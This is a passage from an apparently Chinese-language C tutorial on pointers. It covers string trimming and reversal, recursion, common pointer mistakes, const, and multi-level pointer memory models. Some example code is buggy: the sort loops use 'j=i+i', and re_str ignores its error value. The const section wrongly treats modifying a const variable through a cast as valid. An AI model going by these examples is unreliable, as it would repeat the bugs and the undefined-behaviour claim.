while(isspace(temp_p[j]))&#123;        j--;    &#125;    ncount = j-i+1;    strncpy(newstr,temp_p+i,ncount);    newstr[ncount] = &#39;\0&#39;;    return 0;&#125;int trimSpace2(char* str)&#123;    char* temp_p = str;    int ncount = 0;    if(temp_p == NULL)&#123;        return -1;    &#125;    int i = 0;    int j = strlen(temp_p)-1;    while(isspace(temp_p[i]))&#123;        i++;    &#125;    while(isspace(temp_p[j]))&#123;        j--;    &#125;    ncount = j-i+1;    strncpy(str,temp_p+i,ncount);    str[ncount] = &#39;\0&#39;;//在这个函数里如果这句话没有的话，你就会看到意想不到的结果    return 0;&#125;int main() &#123;    int count = 0;    int res = 0;    char* p = &quot;    zxczcz      &quot;;    char p1[100] = &quot;      efdsfdsfdfd    &quot;;    char buf[1024] = &#123;0&#125;;    res = getCount(p,&amp;count);    if(res != 0)&#123;        printf(&quot;func getCount has something wrong please check and try again\n&quot;);        return res;    &#125;    printf(&quot;字符串的长度为：%d\n&quot;,count);    res = trimSpace(p,buf);    if(res != 0)&#123;        printf(&quot;func trimSpace() has something wrong please check and try again\n&quot;);        return res;    &#125;    printf(&quot;去除两端空格后的字符串为：%s\n&quot;,buf);    res = trimSpace2(p1);    if(res != 0)&#123;        printf(&quot;func trimSpace() has something wrong please check and try again\n&quot;);        return res;    &#125;    printf(&quot;去除两端空格后的字符串为：%s\n&quot;,p1);    return 0;&#125;</code></pre><blockquote><p><strong>注意：</strong> 实际上上面的代码还是能进行优化的，因为去除两边空格的API接口没有必要实现计算字符串长度API接口同样的功能，可以直接调用计算字符串长度的API接口</p></blockquote><p> <strong>（3）字符串逆序模型</strong></p><p><strong>方法一：使用两个指针内容互换的方式</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char p[] = &quot;abcdefgh&quot;;    int len = strlen(p);    char* p1 = p;    char* p2 = p1 + len - 1;    while(p1&lt;p2)&#123;        char c = *p1;        *p1 = *p2;        *p2 = c;        p1++;        p2--;    &#125;    printf(&quot;反转后的字符串为：%s\n&quot;,p);    return 0;&#125;</code></pre><p>我们可以将其封装成接口</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int re_str(char* str1 ,char* str2)&#123;    char* p1 = str1;    char* p2 = str2;    int res = 0;    if(str1 == NULL || str2 == NULL)&#123;        res = -1;    &#125;    int len = strlen(p1);    p2 = p1 + len - 1;    while(p1&lt;p2)&#123;        char c = *p1;        *p1 = *p2;        *p2 = c;        p1++;        p2--;    &#125;    return 0;&#125;int main() &#123;    int res;    char p[] = &quot;abcdefgh&quot;;    char buf[1024] = &#123;0&#125;;    res = re_str(p,buf);    if(res != 0)&#123;        printf(&quot;func re_str() has something wrong,please check and try again&quot;);        return res;    &#125;    printf(&quot;反转后的字符串为：%s\n&quot;,p);    return 0;&#125;</code></pre><p><strong>方法二：使用递归逆序的方法</strong></p><p>这里利用了一个字符串入栈出栈的操作，当入栈的时候是顺序入栈的话，出栈就是逆序的。</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int re_str(char* tmp)&#123;    if(tmp == NULL)&#123;        return -1;    &#125;    if(*tmp == &#39;\0&#39;)&#123;        return 0;    &#125;    re_str(tmp+1);    printf(&quot;%c&quot;,*tmp);    return 0;&#125;int main() &#123;    int res = 0;    char* p = &quot;abcdefegh&quot;;    res = re_str(p);    if(res != 0)&#123;        printf(&quot;func re_str has something wrong , please check and try again&quot;);        return res;    &#125;    return 0;&#125;</code></pre><p>递归操作不得不说是学习过程中的一座大山，那么究竟该如何理解呢？</p><blockquote><p><strong>首先需要理解几点：</strong><br>（1）函数返回时会返回调用他的函数中，并从调用函数的下一句开始执行<br>（2）每次递归传递给函数形参相当于再次创建了一个变量，原始的变量没有消失，并将在后面函数的返回后进行打印等<br>（在这个例子中就是再次创建了一个新的指针指向了字符串的下一个字母，而原来的指针并没有消失，并将在函数返回时打印上一个字母的过程中发挥关键作用。）</p></blockquote><p> <strong>递归内存的图示：</strong></p><p><strong>（1）入栈模型示意图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%80%92%E5%BD%92%E5%85%A5%E6%A0%88%E6%A8%A1%E5%9E%8B.png" alt="此处输入图片的描述"></p><p><strong>（2）函数调用模型示意图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%80%92%E5%BD%92%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A8%A1%E5%9E%8B.png" alt="此处输入图片的描述"></p><p><strong>我们现在加以延伸：</strong></p><p>如果我们不只是想单纯的打印这个字符而是要将其存储在一个内存空间中下次继续使用怎么办？</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;char g_buf[1000];int re_str(char* tmp)&#123;    if(tmp == NULL)&#123;        return -1;    &#125;    if(*tmp == &#39;\0&#39;)&#123;        return 0;    &#125;    re_str(tmp+1);    strncat(g_buf,tmp,1);//每次追加一个字符到指定内存空间    return 0;&#125;int main() &#123;    int res = 0;    char* p = &quot;abcdefegh&quot;;    memset(g_buf,0,sizeof(g_buf));    res = re_str(p);    if(res != 0)&#123;        printf(&quot;func re_str has something wrong , please check and try again&quot;);        return res;    &#125;    printf(&quot;%s&quot;, (char *) g_buf);    return 0;&#125;</code></pre><p>但是由此又出现了一个新的问题：我们现在操控的是一个全局变量，但是如果多线程同时操纵这个全局变量的话，为了变量不被错误篡改，我们就面临着加锁的问题，  那我们能不能不用全局变量实现呢？</p><p>当然可以，我们之前就说过了使用指针传递参数并间接操纵是C语言的精髓</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int re_str(char* tmp,char* mybuf)&#123;    if(tmp == NULL || mybuf == NULL)&#123;        return -1;    &#125;    if(*tmp == &#39;\0&#39;)&#123;        return 0;    &#125;    re_str(tmp+1,mybuf);    strncat(mybuf,tmp,1);    return 0;&#125;int main() &#123;    int res = 0;    char* p = &quot;abcdefegh&quot;;    char mybuf[1024] = &#123;0&#125;;    res = re_str(p,mybuf);    if(res != 0)&#123;        printf(&quot;func re_str has something wrong , please check and try again&quot;);        return res;    &#125;    printf(&quot;%s&quot;, (char *) mybuf);    return 0;&#125;</code></pre><h3 id="七、一级指针常见错误模型"><a href="#七、一级指针常见错误模型" class="headerlink" title="七、一级指针常见错误模型"></a><strong>七、一级指针常见错误模型</strong></h3><p><strong>错误一：对传入的参数的存在性判断出错</strong></p><p>错误写法：</p><pre><code class="hljs">if(*from == &#39;\0&#39; || t*o == &#39;\0&#39;)&#123;    xxx;&#125;</code></pre><p>正确写法：</p><pre><code class="hljs">if(from == NULL || to == NULL)&#123;    xxx;&#125;</code></pre><blockquote><p><strong>错误原因：</strong></p></blockquote><blockquote><p>没有理解指针变量和指针变量指向内存空间的值不是一个概念这句话。我们需要判段传进来的指针是不是一个空指针，而不是判段这个指针指向的内存空间的值是不是0，实际上这个值可以是一万个0，没有任何关系。</p></blockquote><p><strong>错误二：数组越界</strong></p><p>错误写法：</p><pre><code class="hljs">char buf[3] = &quot;abc&quot;;</code></pre><p>正确写法：</p><pre><code class="hljs">char buf[4] = &quot;abc&quot;;</code></pre><blockquote><p><strong>错误原因：</strong></p></blockquote><blockquote><p>没有理解字符串的末尾自带一个\0占据一个字节</p></blockquote><p><strong>错误三：malloc内存的释放错误</strong></p><p>错误案例：</p><p>1.malloc 成功赋值给一个指针变量，但是当你已经改变了指针指向的地址以后，不还原就直接free() 那么这个时候free() 的是一个 未知的内存，程序直接爆炸。<br>2.你free() 内存以后并没有将指针赋值为空，这样会有下次free()同一块内存的风险。</p><p>解决办法：</p><p>1.最好用一个临时指针变量去接这块地址，修改临时的指针变量，到时候free()的时候直接free()原始的字符串指针变量<br>2.在 free() 指针变量指向额内存以后一定要记得将指针变量赋值为NULL.</p><blockquote><p><strong>错误原因：</strong></p><p>没有理解指针变量和指针变量指向内存空间的值不是一个概念这句话</p></blockquote><p><strong>错误四：函数变量的生命周期判断错误</strong></p><p>如果我们在子函数中生命的变量是在栈区，那么这个空间的值在返回到主函数中是会被解析器自动析构的，也就是无法通过指针进行传递的，但是在静态区或堆区就可以通过指针传递。</p><blockquote><p><strong>错误原因：</strong></p><p>使用者没有理解内存四区的 以及概念以及通过指针传递的实际上是一块内存空间。</p></blockquote><p>*<em>错误五：<em>p++</em></em></p><p>如果想改变p 指向内存空间的值的大小，不能直接写 *p++ ,因为++ 比 * 的优先级来得高，直接这样写会先改变指针的指向，于是我们应该 （*p）++</p><blockquote><p><strong>错误原因：</strong></p><p>不了解 ++ 和 * 之间的优先级关系</p></blockquote><h3 id="八、const-修饰符专题"><a href="#八、const-修饰符专题" class="headerlink" title="八、const 修饰符专题"></a><strong>八、const 修饰符专题</strong></h3><p><strong>我们一定要分清楚一下的几种情况（非常重要）：</strong></p><p>1.const int a;<br>2.int const b;<br>3.const char* a;<br>4.char* const b;<br>5.const char* const e;</p><p><strong>解释：</strong></p><p>1.第一种和第二种是完全一样的意思，就是这个变量不能被修改<br>2.要分清第三和第四的区别</p><ul><li>第三个的意思是：指针所指向的地址中的值不能被修改 </li><li>第四个的意思是：指针所指向的地址不能被修改</li></ul><p>3.第五个以此类推：指针指向的变量的地址不能被修改，该变量的值也不能被修改（只读）</p><p><strong>还有一个重点：</strong></p><p>我们一开始这样写：</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    const int a = 0;    a = 10;    return 0;&#125;</code></pre><p>结果:</p><pre><code class="hljs">error: assignment of read-only variable &#39;a&#39;</code></pre><p>编译器告诉你 a 是 read only 的类型，不能修改，但是真的不能修改吗？我们看下面的程序</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    const int a = 0;    int* p = (int *) &amp;a;    *p = 100;    printf(&quot;a:%d&quot;,*p);    return 0;&#125;</code></pre><p>结果：</p><pre><code class="hljs">a:100   </code></pre><p>也就是说我们能绕过 const 来修改变量的值</p><h3 id="九、二级指针输入输出模型概念"><a href="#九、二级指针输入输出模型概念" class="headerlink" title="九、二级指针输入输出模型概念"></a><strong>九、二级指针输入输出模型概念</strong></h3><p><strong>1.回顾一下我们之前讲的二级指针的概念：</strong></p><p>我们之前是通过一级指针来类比二级指针的，我们说我们是通过一级指针变量间接的修改0级指针变量的值（普通变量的值 ） ，因为我们有时候需要在子函数中去直接修改主函数中变量的值，同样的我们是通过二级指针间接的修改一级指针变量的值（换句话说就是改变一级指针的指向），同样我们也有这样的应用场景：有时候我们会在子函数中用 malloc 动态分配空间，并且将其给主函数使用，那么主函数中的一级指针的指向就需要在子函数中动态的改变，因此我们就使用二级指针 来间接的修改主函数一级指针的指向，于是就使用二级指针实现这样的功能。</p><blockquote><p><strong>两个要点：</strong><br>指针做输入：主函数分配内存<br>指针做输出：子函数分配内存</p></blockquote><p><strong>2.二级指针的输出模型：</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int getMem(char** myp1,int* mylen1, char** myp2,int* mylen2)&#123;    char* tmp1 = NULL;    char* tmp2 = NULL;    tmp1 = (char*)malloc(100);    if(tmp1 == NULL)&#123;//这个判断一定是要在分配内存以后再写        return -1;    &#125;    strcpy(tmp1,&quot;asdasdasdasdasd&quot;);    *mylen1 = strlen(tmp1);    *myp1 = tmp1;//通过*间接地修改一级指针变量的值    tmp2 = (char*)malloc(100);    if(tmp2 == NULL)&#123;//这个判断一定是要在分配内存以后再写        return -2;    &#125;    strcpy(tmp2,&quot;qweqweqweqweqwe&quot;);    *mylen2 = strlen(tmp2);    *myp2 = tmp2;    return 0;&#125;// free 函数int getMem_free(char** myp)&#123;    if(myp == NULL)&#123;//判断这个一级指针是不是还存在        return -1;    &#125;    free(*myp);//free 这个一级指针指向的内存空间    *myp = NULL;&#125;int main() &#123;    int res = 0;    char * p1 = NULL;    int len1 = 0;    char * p2 = NULL;    int len2 = 0;    res = getMem(&amp;p1,&amp;len1,&amp;p2,&amp;len2);    if(res != 0)&#123;        printf(&quot;func getMem() has something wrong please check and try again&quot;);        return res;    &#125;    printf(&quot;p1:%s,len1:%d\n&quot;,p1,len1);    printf(&quot;p2:%s,len2:%d\n&quot;,p2,len2);    getMem_free(&amp;p1);    getMem_free(&amp;p2);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">p1:asdasdasdasdasd,len1:15p2:qweqweqweqweqwe,len2:15</code></pre><p><strong>3.二级指针的输入模型</strong></p><p><strong>（1）二级指针做输入的第一种内存模型</strong></p><p>指针数组模式</p><p><strong>示例代码:</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int num = 0;    int i = 0;    int j = 0;    char* tmp = NULL;    char* myArray[] = &#123;&quot;eaaaaa&quot;,&quot;cbbbb&quot;,&quot;sccccccccc&quot;,&quot;add&quot;&#125;;    //myArray[0]、myArray[1]都是指针变量，他们有自己的地址，他们的值是字符串的首地址    num = sizeof(myArray)/sizeof(myArray[0]);    //打印(排序前)    for(i=0;i&lt;num;i++)&#123;        //printf(&quot;%s\n&quot;,myArray[i]);        printf(&quot;排序前：\n%s\n&quot;,*(myArray+i));    &#125;        //排序    for(i=0;i&lt;num;i++)&#123;        for(j=i;j&lt;num;j++)&#123;            //因为字符串的地址是静态地址，是不能改变的，我们只能修改指针变量的指向实现排序            if(strcmp(*(myArray+i),*(myArray+j))&gt; 0)&#123;                tmp = *(myArray + i);                *(myArray+i) = *(myArray+j);                *(myArray+j) = tmp;            &#125;        &#125;    &#125;    //打印(排序后)    for(i=0;i&lt;num;i++)&#123;        //printf(&quot;%s\n&quot;,myArray[i]);        printf(&quot;排序后:\n%s\n&quot;,*(myArray+i));    &#125;    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">排序前：eaaaaacbbbbscccccccccadd排序后:addcbbbbeaaaaasccccccccc</code></pre><p>现在我们对不同的功能进行函数封装</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int printArray(char** myArray,int num)&#123;    //使用二级还是一级指针要看传进来的是普通变量的地址还是指针变量的地址    //你想操纵指针变量的值肯定是需要传递指针变量的地址，这样才能间接使用    int i = 0;    for(i=0;i&lt;num;i++)&#123;        //printf(&quot;%s\n&quot;,myArray[i]);        printf(&quot;%s\n&quot;,*(myArray+i));//指针变量的地址加上*代表指针变量的值    &#125;    return 0;&#125;int sortArray(char** myArray,int num)&#123;    int i =0;    int j =0;    char* tmp = NULL;    for(i=0;i&lt;num;i++)&#123;        for(j=i;j&lt;num;j++)&#123;            if(strcmp(*(myArray+i),*(myArray+j))&gt; 0)&#123;                tmp = *(myArray + i);                *(myArray+i) = *(myArray+j);                *(myArray+j) = tmp;            &#125;        &#125;    &#125;    return 0;&#125;int main() &#123;    int num = 0;    int i = 0;    int j = 0;    char* tmp = NULL;    char* myArray[] = &#123;&quot;eaaaaa&quot;,&quot;cbbbb&quot;,&quot;sccccccccc&quot;,&quot;add&quot;&#125;;    num = sizeof(myArray)/sizeof(myArray[0]);//这里可以重点关注一下是如何求数组长度的    //打印(排序前)    printf(&quot;排序前：\n&quot;);    printArray(myArray,num);    //排序    sortArray(myArray,num);    printf(&quot;排序后:\n&quot;);    printArray(myArray,num);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">排序前：eaaaaacbbbbscccccccccadd排序后:addcbbbbeaaaaasccccccccc</code></pre><p><strong>注意点:</strong></p><p><strong>1.理解为什么函数传参数的时候使用的是二级指针</strong></p><p>因为C语言没有字符串类型，字符串都使用字符串的首地址表示的，现在我们把多个字符串进行了封装，变成了一个字符串数组，换句话说就是一个指针数组（myArray[0]、myArray<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%85%E5%AD%98%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B%E7%A4%BA%E6%84%8F%E5%9B%BE.png">1</a>都是指针变量，他们有自己的地址，他们的值是字符串的首地址），于是我们首先要用二级指针接收指针变量的地址，然后间接修改的指针变量的值（也就是指针指向的那个的内存空间的地址） 。</p><p><strong>2.malloc() 分配内存的检测和释放问题</strong></p><p>以后一定要检查是否分配成功了，使用完成以后记得要释放指针指向的内存空间，使用free() 函数，这里面放的是内存空间的地址（或者说是一级指针的值），然后我们还要记得将指针的值（指针指向的内存空间）赋值为NULL这个地址，防止下次出现重复free() 。</p><p><strong>3.指针还是数组？</strong></p><p>这里我操纵数组全部使用的是指针的比较，没有使用[]，其实[]完全也是可以的，我只不过是想演示一下指针的操作而已，让大家都有一个认识，不要只会看[]，不过不得不承认[]的可读性要好得多。</p><p><strong>4.我们排序时操纵的究竟是什么</strong></p><p>因为字符串是存储在静态存储区的，地址是不能改变的，因此我们只能改变指针变量的指向的地址（也就是改变指针变量的值）来实现排序。</p><p><strong>（2）二级指针做输入的第二种内存模型</strong></p><p>多维数组模式</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0,j = 0,num = 4;    char tmpBuf[30];    char myBuf[30];    char myArray[10][30] = &#123;&quot;xxx&quot;, &quot;asdada&quot;, &quot;111111&quot;, &quot;cccccc&quot;&#125;;    printf(&quot;排序前：\n&quot;);    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,myArray[i]);//myArray[i] 等同于 *(myArray+i)    &#125;    for(i=0;i&lt;num;i++)&#123;        for(j=i;j&lt;num;j++)&#123;            if(strcmp(myArray[i],myArray[j])&gt;0)&#123;//这个是一个常见的错误                strcpy((char *) tmpBuf, myArray[i]);                strcpy(myArray[i],myArray[j]);                strcpy(myArray[j], (char *) tmpBuf);            &#125;        &#125;    &#125;    printf(&quot;排序后：\n&quot;);    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,myArray[i]);    &#125;    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">排序前：xxxasdada111111cccccc排序后：111111asdadaccccccxxx</code></pre><p>我们将功能进行简单的封装：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int printArray(char myArray[10][30],int num)&#123;    int i =0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,myArray[i]);//myArray[i] 等同于 *(myArray+i)    &#125;    return 0;&#125;int sortArray(char myArray[10][30],int num)&#123;    int i = 0,j = 0;    char tmpBuf[30];    for(i=0;i&lt;num;i++)&#123;        for(j=i;j&lt;num;j++)&#123;            if(strcmp(myArray[i],myArray[j])&gt;0)&#123;//这里比较容易犯错误                strcpy((char *) tmpBuf, myArray[i]);                strcpy(myArray[i],myArray[j]);                strcpy(myArray[j], (char *) tmpBuf);            &#125;        &#125;    &#125;&#125;int main() &#123;    int i = 0,j = 0,num = 4;    char tmpBuf[30];    char myBuf[30];    char myArray[10][30] = &#123;&quot;xxx&quot;, &quot;asdada&quot;, &quot;111111&quot;, &quot;cccccc&quot;&#125;;    printf(&quot;排序前：\n&quot;);    printArray(myArray,num);    sortArray(myArray,num);    printf(&quot;排序后：\n&quot;);    printArray(myArray,num);    return 0;&#125;</code></pre><p><strong>（3）二级指针做输入的第三种内存模型</strong></p><p>全部自己动态的使用malloc()分配</p><p>自己 malloc() 一块内存空间用来存放<strong>指针变量</strong>，再让每一个指针变量都指向一个用 malloc分配的内存空间</p><p>首先在看代码的前面提一个要求：</p><p><strong>对于二级或者多级指针我们要求理解的深，但是思考的少，什么意思？</strong></p><p>**（1）理解的深：**就是我随便问你一个代码，你都能非常清楚地知道这个是谁的值，谁的地址<br>**（2）思考的少：**我们在写代码的时候千万不要每次看到一个和指针有关的东西就开始分析，其实没有必要，这样做反而会大大降低我们写代码的速度，而且很有可能自己写着写着就把自己绕进去了。我们应该都能在写代码的时候清楚地知道几个关键的原则</p><p><strong>原则：</strong></p><p>1.我们如果要在子函数操纵的是一级指针的值，那么我们传递参数的时候形参肯定是二级指针，传进去的肯定是一级指针的地址。<br>2.我们如果要在子函数操纵的是二级指针的值，那么我们传递参数的时候形参肯定是三级指针，传进去的肯定是一级指针的地址。<br>3.子函数中只能改变的是比形参低一级的指针的值，永远也不要想能改和形参同级的指针的值，因为即使你改了，你改的也是形参的值（形参和实参是在不同内存空间的，即使你把传进来的形参的值置为空还是没有改变实参的值）</p><p><strong>代码示例：</strong></p><p> 下面代码的排序使用的是交换指针的方式</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char** p = NULL;    int num = 5;    int i = 0,j = 0;    char* tmp = NULL;    //初始化    p = (char**)malloc(sizeof(char*)*num);//二级指针存放的是一级指针的地址    for(i=0;i&lt;num;i++)&#123;        p[i] = (char*)malloc(sizeof(char)*100);//一级指针存放的是零级指针的地址        sprintf(p[i],&quot;%d%d%d&quot;,i,i+1,i+2);    &#125;    //打印    printf(&quot;排序前:\n&quot;);    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,p[i]);    &#125;    //排序    for(i=0;i&lt;num;i++)&#123;        for(j=i+i;j&lt;num;j++)&#123;            if(strcmp(p[i],p[j])&lt;0)&#123;                tmp = p[i];                p[i] = p[j];                p[j] = tmp;            &#125;        &#125;    &#125;    //打印    printf(&quot;排序后:\n&quot;);    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,p[i]);    &#125;    //释放内存    for(i=0;i&lt;num;i++)&#123;        if(p[i] != NULL)&#123;            free(p[i]);            p[i] = NULL;//将一级指针指向的地址清空        &#125;    &#125;    if(p != NULL)&#123;        free(p);//释放一级指针占用的内存空间        p = NULL;//清空二级指针的值    &#125;        return 0;&#125;</code></pre><p>下面内存空间的值的做法进行排序</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char** p = NULL;    int num = 5;    int i = 0,j = 0;    char* tmp = NULL;    char tmpbuf[100] = &#123;0&#125;;    //初始化    p = (char**)malloc(sizeof(char*)*num);    for(i=0;i&lt;num;i++)&#123;        p[i] = (char*)malloc(sizeof(char)*100);        sprintf(p[i],&quot;%d%d%d&quot;,i,i+1,i+2);    &#125;    //打印    printf(&quot;排序前:\n&quot;);    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,p[i]);    &#125;    //排序    for(i=0;i&lt;num;i++)&#123;        for(j=i+i;j&lt;num;j++)&#123;            if(strcmp(p[i],p[j])&lt;0)&#123;                strcpy(tmpbuf,p[i]);                strcpy(p[i],p[j]);                strcpy(p[j],tmpbuf);            &#125;        &#125;    &#125;    //打印    printf(&quot;排序后:\n&quot;);    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,p[i]);    &#125;    //释放内存    for(i=0;i&lt;num;i++)&#123;        if(p[i] != NULL)&#123;            free(p[i]);            p[i] = NULL;        &#125;    &#125;    if(p != NULL)&#123;        free(p);        p = NULL;    &#125;    return 0;&#125;    </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">排序前:012123234345456排序后:456345234123012</code></pre><p>现在我们将各个功能进行封装，封装就意味着需要传递参数，还是坚持那个原则，如果我们要操纵变量的值的时候还是要入指针，但是如果只是为了输出或者其他，而没有改变值的话，可以就直接传入就行了。</p><p><strong>错误示例代码：</strong></p><p><strong>问题我在注释中已经指明，正确的代码在下一小节中会有</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;char** getMem(int num)&#123;    int i = 0;    char ** p = NULL;    p = (char**)malloc(sizeof(char*)*num);    if(p == NULL)&#123;        return NULL;    &#125;    for(i=0;i&lt;num;i++)&#123;        p[i] = (char*)malloc(sizeof(char)*100);        sprintf(p[i],&quot;%d%d%d&quot;,i,i+1,i+2);    &#125;    return p;&#125;void* sortArray(char** p,int num)&#123;    int i = 0,j = 0;    char* tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(strcmp(p[i],p[j])&lt;0)&#123;                tmp = p[i];                p[i] = p[j];                p[j] = tmp;            &#125;        &#125;    &#125;&#125;void* printArray(char** p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,p[i]);    &#125;&#125;void* memFree(char** p, int num)&#123;    int i =0;    for(i=1;i&lt;num;i++)&#123;        if(p[i] != NULL)&#123;            free(p[i]);            p[i] = NULL;        &#125;    &#125;    if(p != NULL)&#123;        free(p);        p = NULL;//问题在在这里，看到了吗，这个函数我们传进来的是二级指针，我们是不能改变这个二级指针的值的，因为这个是临时变量，你改了也没用，还有就是我们一直建议不要直接修改参数的值，防止以后再用的时候出现问题    &#125;&#125;int main() &#123;    char** p = NULL;    int num = 5;    //初始化    p = getMem(num);    //打印    printf(&quot;排序前:\n&quot;);    printArray(p,num);    //排序    sortArray(p,num);        //打印    printf(&quot;排序后:\n&quot;);    printArray(p,num);    //释放内存    memFree(p,num);    return 0;&#125;</code></pre><p><strong>（4）二级指针做输入的第三种内存模型示意图：</strong></p><p><strong>再回忆一下二级指针的三种模型：</strong></p><p>（1） 一阶指针数组<br>（2）二阶字符串数组<br>（3）malloc 动态分配</p><p><strong>示例代码：</strong></p><pre><code class="hljs">void main()&#123;    int i =0;    char* p1[] = &#123;&quot;111&quot;,&quot;222&quot;,&quot;333&quot;&#125;;//一阶指针数组    char p2[3][17] = &#123;&quot;111&quot;,&quot;222&quot;,&quot;333&quot;&#125;;//二阶字符串数组    char** p3 = malloc(sizeof(char*)*3);//手动二阶内存    for(i=0;i&lt;3;i++)&#123;        p3[i] = (char*)malloc(sizeof(char)*10);        sprintf(p3[i],&quot;%d%d%d&quot;,i+1,i+1,i+1);    &#125;&#125;</code></pre><p><strong>图示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BA%8C%E7%BA%A7%E6%8C%87%E9%92%88%E5%81%9A%E8%BE%93%E5%85%A5%E7%9A%84%E7%AC%AC%E4%B8%89%E7%A7%8D%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="此处输入图片的描述"></p><p><strong>注意：</strong></p><p>p1+1 和 p3+1 都是移动一个指针的距离（是由指向的地址的内容的长度决定的），因此他们的步长是一样的。但是 p2+1 移动的距离和数组的长度有关也就是说如果我们声明的时候是 p2[10][30] 那么即使我们字符串只有4个字节，p2+1 还是会移动30个字节。</p><p><strong>4.玩转多级指针</strong></p><p><strong>回忆一句话：</strong></p><p>要想在被调用函数中间接的修改实参的值，我们要把实参的地址转进去，形参变成实参指针数+1 级指针，然后在被调用函数中使用 *  间接地修改值</p><p><strong>那么我们什么情况下需要用到三级指针呢？</strong></p><p>当我们想在被调用函数中修改主函数中传递进去的二级指针的值的时候，我们就会在被调用函数的参数中使用三级指针</p><p>好，现在我们就用上面的例子做修改来给大家演示一下使用三级指针在子函数中直接动态分配内存而不是在主函数中接收返回值的方式。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int  getMem(char*** p,int num)&#123;    int i = 0;    char** tmp = NULL;    if(p == NULL)&#123;        return -1;    &#125;    tmp = (char**)malloc(sizeof(char*)*num);    if(tmp == NULL)&#123;        return -1;    &#125;    for(i=0;i&lt;num;i++)&#123;        tmp[i] = (char*)malloc(sizeof(char)*100);        sprintf(tmp[i],&quot;%d%d%d&quot;,i,i+1,i+2);    &#125;    *p = tmp;    return 0;&#125;void* sortArray(char** p,int num)&#123;    int i = 0,j = 0;    char* tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(strcmp(p[i],p[j])&lt;0)&#123;                tmp = p[i];                p[i] = p[j];                p[j] = tmp;            &#125;        &#125;    &#125;&#125;void* printArray(char** p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;%s\n&quot;,p[i]);    &#125;&#125;int  memFree(char*** p, int num)&#123;    int i =0;    char** tmp = NULL;//创建临时的指针变量，不直接修改参数的值    if(p == NULL)&#123;        return -1;    &#125;    tmp = *p;    for(i=0;i&lt;num;i++)&#123;        if(tmp[i] != NULL)&#123;            free(tmp[i]);            tmp[i] = NULL;        &#125;    &#125;    free(tmp);    *p = NULL;//通过三级指针将二级指针的值清空    return 0;&#125;    int main() &#123;    char** p = NULL;    int num = 5;    //初始化    getMem(&amp;p,num);        //打印    printf(&quot;排序前:\n&quot;);    printArray(p,num);    //排序    sortArray(p,num);    //打印    printf(&quot;排序后:\n&quot;);    printArray(p,num);    //释放内存    memFree(&amp;p,num);    return 0;&#125;</code></pre><p>这里相对可能难度较大，要求深刻理解内存四区的的概念，理解 p[i] 和 *(p+i) 